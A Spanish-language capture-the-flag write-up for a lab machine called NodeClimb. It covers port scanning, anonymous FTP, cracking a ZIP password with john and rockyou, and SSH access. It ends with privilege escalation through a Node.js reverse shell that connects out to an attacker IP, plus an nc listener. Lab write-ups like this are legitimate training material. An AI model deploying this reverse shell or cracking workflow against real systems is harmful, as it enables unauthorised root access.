![[Pentesting/Writeups/Images/NodeClimb/1.png]]

## Conectividad con la máquina objetivo

Vemos que al desplegar la máquina nos da una IP, así que hacemos un ping y comprobamos la conectividad.

![[Pentesting/Writeups/Images/NodeClimb/3.png]]

Hacemos ping y vemos que tenemos conectividad

![[Pentesting/Writeups/Images/NodeClimb/4.png]]

## Descubrimiento de Puertos y Servicios

Lanzo un escaneo con `nmap` y compruebo lo siguiente:

`nmap -p- -sS -sC -sV -O 172.17.0.2 -oN puertos.txt`

![[Pentesting/Writeups/Images/NodeClimb/2.png]]

### Puertos y Servicios

| Puerto | Servicio | Versión       |
| ------ | -------- | ------------- |
| 21     | FTP      | Vsftpd 3.0.3  |
| 22     | SSH      | OpenSSH 9.2p1 |

## Fase de Explotación

Vemos que podemos entrar como **anonymous** en FTP y que hay un archivo ZIP. Nos los traemos a nuestra máquina con el comando get.

![[Pentesting/Writeups/Images/NodeClimb/5.png]]

Lo abrimos y a simple vista veo que hay un .txt con la clave para entrar por SSH.

![[Pentesting/Writeups/Images/NodeClimb/6.png]]

Si lo intentamos extraer nos pide una clave, pero no la sabemos.

Podemos convertir el fichero a un hash para luego con john hacer fuerza bruta para sacar la clave del .zip.

`zip2jhon secretitopicaron.zip > secretitohash`

![[Pentesting/Writeups/Images/NodeClimb/7.png]]

Ahora con `jhon` intentamos sacar la clave.

`john --format=PKZIP -w /usr/share/wordlist/rockyou.txt secretitohash`

![[Pentesting/Writeups/Images/NodeClimb/8.png]]

Y vemos que la clave es *password1*

Lo intentamos extraer y vemos que si nos deja, abrimos el password.txt y sale esto.

![[Pentesting/Writeups/Images/NodeClimb/9.png]]

Por lo que entramos por SSH y vemos que podemos ejecutar como cualquier usuario el binario node pero solo el script que hay en /home/mario.

![[Pentesting/Writeups/Images/NodeClimb/10.png]]

Si abrimos el script, vemos que está vacido. Podemos meter una reverse shell y ejecutarla como root para conseguir privilegios.

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "192.168.1.246", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

En la máquina atacante, en nuestro kali, ejecutamos primero:

`nc -nlvp 443`

Y luego ejecutamos el script

Si se queda colgado y en nuestra máquina conseguimos la bash lo hemos hecho bien.

Ahora ejecutamos `whoami` y vemos que somos root.

![[Pentesting/Writeups/Images/NodeClimb/11.png]]

Ya somos root!!
